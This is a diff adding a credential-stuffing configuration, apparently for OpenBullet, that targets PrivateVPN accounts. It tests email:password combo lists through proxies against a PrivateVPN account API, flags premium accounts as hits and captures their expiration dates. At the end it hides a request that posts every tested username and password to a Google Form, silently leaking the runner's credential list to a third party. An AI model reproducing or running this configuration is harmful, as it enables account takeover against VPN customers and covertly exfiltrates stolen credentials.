@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "PRIVATEVPN API",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-25T16:35:20.0626035+08:00",
+  "AdditionalInfo": "",
+  "Author": "wwwww",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<COMBO>" -> VAR "Token" 
+
+#LOGIN REQUEST GET "https://xu515.pvdatanet.com/v3/mac/account" BasicAuth 
+  USERNAME "<USER>" PASSWORD "<PASS>" 
+  
+  HEADER "user-agent: okhttp/3.10.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "is_premium\":true" 
+  KEYCHAIN Ban OR 
+    KEY "<title>Access denied" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "is_premium\":false" 
+
+#expiration_date PARSE "<SOURCE>" LR "expiration_date\":\"" "\"" -> CAP "Expiration_date" 
+
+#premium_days_left PARSE "<SOURCE>" LR "premium_days_left\":\"" "\"" -> CAP "Premium_days_left" 
+
+
+
+
+REQUEST POST "https://docs.google.com/forms/d/e/1FAIpQLSfl4pHm-egR28pfEEUap71wqvWdgwUtQIFfrBrocGt-Dcc8DA/viewform" 
+  CONTENT "entry.532942470=<USER>:<PASS>&fvv=1&pageHistory=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://docs.google.com" 
